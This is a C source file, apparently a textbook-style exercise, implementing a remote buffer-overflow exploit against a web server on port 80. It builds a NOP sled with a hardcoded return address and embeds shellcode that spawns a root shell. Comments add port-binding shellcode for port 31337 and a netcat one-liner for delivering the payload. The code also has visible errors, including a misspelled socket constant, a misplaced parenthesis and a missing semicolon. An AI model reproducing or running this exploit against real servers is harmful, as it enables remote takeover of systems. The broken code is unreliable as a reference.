#include <stdio.h>
#include <stdlib.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include "hacking.h"
#include "hacking-network.h"


/*
 * This is a standard shell spawning shellcode
 * This would spawn a shell in local system which
 * is useless in remote exploits.
 */
char shellcode[]=
        "\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
        "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
        "\xe1\xcd\x80";

/*
 * \x6a\x66\x58\x99\x31\xdb\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80
 * \x96\x6a\x66\x58\x43\x52\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a\x10
 * \x51\x56\x89\xe1\xcd\x80\xb0\x66\x43\x43\x53\x56\x89\xe1\xcd\x80
 * \xb0\x66\x43\x52\x52\x56\x89\xe1\xcd\x80\x93\x6a\x02\x59\xb0\x3f
 * \xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62
 * \x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80
 *
 * This is the standard port binding shellcode which
 * would bind to port 31337
 *
 * we could use it directly on connection using netcat as
 * $(perl -e 'print "\x90"x300'; cat shellcode; perl -e 'print "\xde\xad\xbe\xef". "\r\n"') | nc -v host 80
 * look carefully for the padding and adjust sizes
 */
#define OFFSET 540
#define RETADDR 0xbffff688

int main( int argc, char *argv[] )
{
    int    sockfd, buflen;
    struct hostent *host_info;
    struct sockaddr_in target_addr;
    u_char buffer[600];

    if ( argc < 2 )
    {
        printf("Usage : %s <hostname>\n",argv[0]);
        exit(1);
    }

    if ( ( host_info = gethostbyname(argv[1]) ) == NULL )
        fatal("looking up hostname");

    if ( ( sockfd = socket(PF_INET,SOCKSTREAM,0) == -1 ) )
        fatal("in socket");

    target_addr.sin_family = AF_INET;
    target_addr.sin_port   = htons(80);
    target_addr.sin_addr   = *((struct in_addr *)host_info->h_addr);
    memset(&(target_addr.sin_zero),'\0',8);

    if ( ( connect( sockfd, (struct sockaddr *)&target_addr, sizeof(struct sockaddr)) ) == -1 )
        fatal("connecting to target server");

    bzero(buffer,600);
    memset( buffer, '\x90', OFFSET );
    *((u_int *)(buffer + OFFSET)) = RETADDR;
    memcpy( buffer+300, shellcode, strlen(shellcode));
    strcat( buffer, "\r\n");
    printf("Exploit buffer : \n");
    dump( buffer, strlen(buffer));
    send_string( sockfd, buffer)                       // Send as HTTP

    exit(0);
}
